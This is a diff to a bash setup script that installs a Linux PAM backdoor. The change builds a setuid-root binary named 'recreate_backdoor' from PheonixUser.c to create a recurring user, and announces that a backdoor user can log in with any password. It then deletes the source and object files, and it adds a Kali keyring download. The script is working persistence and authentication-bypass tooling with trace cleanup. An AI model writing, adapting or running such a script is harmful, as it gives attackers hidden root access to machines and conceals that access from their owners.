@@ -1,6 +1,7 @@
 #!/bin/bash
 
-sudo apt update
+sudo wget https://archive.kali.org/archive-keyring.gpg -O /usr/share/keyrings/kali-archive-keyring.gpg
+sudo apt update -y
 sudo apt install libpam0g-dev
 
 
@@ -29,7 +30,8 @@ else
 fi
 
 
-gcc recreate_backdoor.c -o recreate_backdoor
+# Create recurring user
+gcc PheonixUser.c -o recreate_backdoor
 sudo chown root:root recreate_backdoor
 sudo chmod 4755 recreate_backdoor
 
@@ -43,6 +45,7 @@ echo "[✔] Setup complete. Try logging in as '$BACKDOOR_USER' with any password
 
 sudo rm backdoor.c
 sudo rm pam_backdoor.o
+sudo rm PheonixUser.c
 
 echo "[✔] Clean complete
 
